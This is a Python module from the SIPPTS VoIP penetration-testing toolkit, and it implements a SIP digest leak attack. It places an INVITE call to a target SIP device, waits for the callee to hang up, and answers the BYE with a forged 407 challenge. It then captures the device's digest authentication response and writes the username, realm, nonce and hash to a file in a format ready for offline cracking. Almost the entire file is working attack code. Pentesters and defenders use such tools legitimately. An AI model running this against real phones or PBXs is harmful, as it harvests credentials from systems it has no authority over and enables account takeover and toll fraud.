#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.0.0'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import sys
import ipaddress
import re
from lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port

BRED = '\033[1;31;40m'
RED = '\033[0;31;40m'
BRED_BLACK = '\033[1;30;41m'
RED_BLACK = '\033[0;30;41m'
BGREEN = '\033[1;32;40m'
GREEN = '\033[0;32;40m'
BGREEN_BLACK = '\033[1;30;42m'
GREEN_BLACK = '\033[0;30;42m'
BYELLOW = '\033[1;33;40m'
YELLOW = '\033[0;33;40m'
BBLUE = '\033[1;34;40m'
BLUE = '\033[0;34;40m'
BMAGENTA = '\033[1;35;40m'
MAGENTA = '\033[0;35;40m'
BCYAN = '\033[1;36;40m'
CYAN = '\033[0;36;40m'
BWHITE = '\033[1;37;40m'
WHITE = '\033[0;37;40m'


class SipDigestLeak:
    def __init__(self):
        self.ip = ''
        self.rport = '5060'
        self.proto = 'UDP'
        self.domain = ''
        self.contact_domain = ''
        self.from_user = '100'
        self.from_name = ''
        self.from_domain = ''
        self.to_user = '100'
        self.to_name = ''
        self.to_domain = ''
        self.user_agent = 'pplsip'
        self.ofile = ''

    def start(self):
        supported_protos = ['UDP', 'TCP']

        self.proto = self.proto.upper()

        # check protocol
        if self.proto not in supported_protos:
            print(BRED + 'Protocol %s is not supported' % self.proto)
            sys.exit()

        print(BWHITE + '[!] Target: ' + GREEN + '%s:%s/%s' %
              (self.ip, self.rport, self.proto))
        print(BWHITE + '[!] Caller: ' + GREEN + '%s' % self.from_user)
        print(BWHITE + '[!] Callee: ' + GREEN + '%s' % self.to_user)
        print(WHITE)

        self.call(self.ip, self.rport, self.proto)

    def call(self, ip, port, proto):
        method = 'INVITE'

        # my IP address
        local_ip = get_machine_default_ip()

        # SIP headers
        if self.domain == '':
            self.domain = ip
        if self.from_domain == '':
            self.from_domain = ip
        if self.to_domain == '':
            self.to_domain = ip
        if self.contact_domain == '':
            self.contact_domain = local_ip

        try:
            if self.proto == 'UDP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print(RED+'Failed to create socket')
            sys.exit(1)

        bind = '0.0.0.0'
        lport = 5060

        try:
            sock.bind((bind, lport))
        except:
            lport = get_free_port()
            sock.bind((bind, lport))

        host = (str(ip), int(port))

        branch = generate_random_string(71, 0)
        callid = generate_random_string(32, 1)
        tag = generate_random_string(8, 1)

        msg = create_message(method, self.contact_domain, self.from_user, self.from_name, self.from_domain, 
                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, '1', '', '', '', 0)

        print(YELLOW + '[=>] Request %s' % method + WHITE)

        try:
            sock.settimeout(15)

            # send INVITE
            if proto == 'TCP':
                sock.connect(host)

            sock.sendto(bytes(msg[:8192], 'utf-8'), host)

            rescode = '100'

            while rescode[:1] == '1':
                # receive temporary code
                resp = sock.recv(4096)

                headers = parse_message(resp.decode())

                if headers:
                    response = '%s %s' % (
                        headers['response_code'], headers['response_text'])
                    rescode = headers['response_code']
                    print(CYAN + '[<=] Response %s' % response)

                    totag = headers['totag']

            # receive 200 Ok - call answered
            if headers['response_code'] == '200':
                # send ACK
                print(YELLOW + '[=>] Request ACK')
                msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                     self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, '1', totag, '', '', 0)

                sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                # wait for BYE
                bye = False
                while bye == False:
                    print(WHITE + '\t... waiting for BYE ...')

                    resp = sock.recv(4096)
                    if resp.decode()[0:3] == 'BYE':
                        bye = True
                        print(CYAN + '[<=] Received BYE')
                        headers = parse_message(resp.decode())
                        branch = headers['branch']

                # send 407 with digest
                msg = create_response_error('407 Proxy Authentication Required', self.from_user,
                                            self.to_user, proto, self.domain, lport, 2, 'BYE', branch, callid, tag, totag, local_ip)

                print(
                    YELLOW + '[=>] Request 407 Proxy Authentication Required')
                sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                # receive auth BYE
                resp = sock.recv(4096)
                print(CYAN + '[<=] Received BYE with digest')

                headers = parse_message(resp.decode())
                branch = headers['branch']
                auth = headers['auth']

                # send 200 OK
                cseq = headers['cseq']
                msg = create_response_ok(
                    self.from_user, self.to_user, proto, self.domain, lport, int(cseq), branch, callid, tag, totag,)

                print(YELLOW + '[=>] Request 200 Ok\n')
                sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                print(BGREEN + 'Auth=%s\n' % auth + WHITE)

                headers = parse_digest(auth)

                if self.ofile != '':
                    data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
                        ip, local_ip, headers['username'], headers['realm'], headers['uri'], headers['nonce'], headers['cnonce'], headers['nc'], headers['qop'], headers['response'])

                    f = open(self.ofile, 'w')
                    f.write(data)
                    f.close()

                    print(WHITE+'Auth data saved in file %s' % self.ofile)
        except socket.timeout:
            pass
        except:
            pass
        finally:
            sock.close()

        return
